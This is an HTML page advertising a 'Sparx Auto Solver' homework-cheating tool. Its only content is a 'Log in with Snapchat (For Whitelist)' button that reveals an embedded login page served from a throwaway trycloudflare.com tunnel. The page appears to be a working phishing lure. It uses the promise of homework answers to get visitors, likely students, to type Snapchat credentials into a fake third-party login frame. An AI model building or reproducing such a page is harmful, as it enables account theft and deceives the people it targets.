<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sparx Auto Solver</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #1e90ff, #ff7f50);
            color: #fff;
            height: 100vh;
        }
        h1 {
            font-size: 3rem;
            margin-bottom: 20px;
        }
        .button-container {
            margin: 20px;
        }
        .snapchat-button {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #FFFC00;
            border: none;
            border-radius: 8px;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            color: #000;
            text-decoration: none;
        }
        .snapchat-button img {
            width: 30px;
            height: 30px;
            margin-right: 10px;
            border-radius: 50%;
        }
        #iframe-container {
            display: none;
            margin-top: 20px;
        }
        iframe {
            border: none;
            width: 100%; /* Full width */
            height: 85%; /* Almost full height */
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
    </style>
    <script>
        function showIframe() {
            document.getElementById('iframe-container').style.display = 'block';
        }
    </script>
</head>
<body>
    <h1>Sparx Auto Solver</h1>
    <div class="button-container">
        <button class="snapchat-button" onclick="showIframe()">
            <img src="https://pbs.twimg.com/profile_images/1840822616405180416/nKBnrqRE_400x400.jpg" alt="Snapchat Logo">
            Log in with Snapchat (For Whitelist)
        </button>
    </div>
    <div id="iframe-container">
        <iframe src="https://cabinets-attachments-although-mexican.trycloudflare.com/login.html" title="Embedded Login Page"></iframe>
    </div>
</body>
</html>
